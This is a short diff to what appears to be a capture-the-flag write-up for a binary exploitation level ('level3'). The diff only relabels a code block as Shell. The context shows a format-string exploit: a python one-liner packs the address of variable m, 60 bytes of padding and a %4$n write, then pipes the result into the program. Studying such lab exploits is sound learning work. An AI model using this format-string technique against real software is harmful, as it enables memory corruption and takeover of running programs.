@@ -40,6 +40,6 @@ Ok we have the address and a value time to put the value in the `m`
 The injection will look like:
 [address of `m` (to set the printf pointer on it)][64 - len(address) = 60][%4$n(start of our buffer)]
 
-```
+```Shell
 python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit && cat /tmp/exploit - | ./level3
 ```
